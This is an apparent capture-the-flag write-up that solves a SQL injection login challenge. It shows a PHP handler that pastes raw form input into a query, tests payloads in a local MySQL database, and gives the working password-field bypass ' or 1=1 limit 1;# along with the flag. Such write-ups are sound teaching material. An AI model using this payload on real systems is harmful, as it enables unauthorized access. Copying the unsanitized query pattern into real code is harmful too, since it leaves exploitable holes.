### Solved by et0x

Injection 1 is a 90 point web exploitation challenge. 

> Daedalus Corp. has been working on their login service, using a brand new SQL database to store all of the access credentials. Can you figure out how to login? 

Upon visiting the provided link, you are greeted with a simple login form and the source code for the php handler for logins.

```php
<?php
include "config.php";
$con = mysqli_connect("localhost", "sql1", "sql1", "sql1");
$username = $_POST["username"];
$password = $_POST["password"];
$debug = $_POST["debug"];
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($con, $query);

if (intval($debug)) {
  echo "<pre>";
  echo "username: ", htmlspecialchars($username), "\n";
  echo "password: ", htmlspecialchars($password), "\n";
  echo "SQL query: ", htmlspecialchars($query), "\n";
  if (mysqli_errno($con) !== 0) {
    echo "SQL error: ", htmlspecialchars(mysqli_error($con)), "\n";
  }
  echo "</pre>";
}

if (mysqli_num_rows($result) !== 1) {
  echo "<h1>Login failed.</h1>";
} else {
  echo "<h1>Logged in!</h1>";
  echo "<p>Your flag is: $FLAG</p>";
}

?> 
```
As you can see, there is no input validation for the username and password fields, all that the script checks for is that there is only one result in the SQL query.  Lets replicate the queries on a local SQL database so we can see what is happening.

The structure for the table is very basic:

```
mysql> select * from users_tbl;
+---------+----------+-----------+
| user_id | username | password  |
+---------+----------+-----------+
|       1 | admin    | adminpass |
|       2 | user     | userpass  |
+---------+----------+-----------+
2 rows in set (0.00 sec)
```

Now to try to get a positive result from our query.

```
mysql> SELECT * FROM users_tbl WHERE username='admin' AND password='asdf' or 1=1;#;
+---------+----------+-----------+
| user_id | username | password  |
+---------+----------+-----------+
|       1 | admin    | adminpass |
|       2 | user     | userpass  |
+---------+----------+-----------+
2 rows in set (0.00 sec)
```

Okay, now we have results, but as we discussed before, the script makes sure that only one result was found, so we should be able to add a limit 1 statement to limit our results.

```
mysql> SELECT * FROM users_tbl WHERE username='admin' AND password='asdf' or 1=1 limit 1;#;
+---------+----------+-----------+
| user_id | username | password  |
+---------+----------+-----------+
|       1 | admin    | adminpass |
+---------+----------+-----------+
1 row in set (0.00 sec)
```

Great!  Now all we have to do is enter the following in the login form:

>Username: admin

>Password: ' or 1=1 limit 1;#

Sure enough, the login works.  The flag is **flag_vFtTcLf7w2st5FM74b**
